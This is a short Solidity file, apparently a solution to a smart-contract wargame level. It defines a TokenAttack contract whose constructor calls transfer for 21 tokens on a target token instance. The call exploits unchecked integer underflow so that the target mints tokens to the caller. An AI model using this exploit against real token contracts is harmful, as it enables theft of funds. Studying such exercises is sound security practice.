// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IToken {
        function transfer(address _to, uint _value) external returns(bool);
        function balanceOf(address _owner) external returns(uint256);
}

contract TokenAttack {
    constructor(address _instance) public {
        IToken(_instance).transfer(msg.sender, 21);
    }
}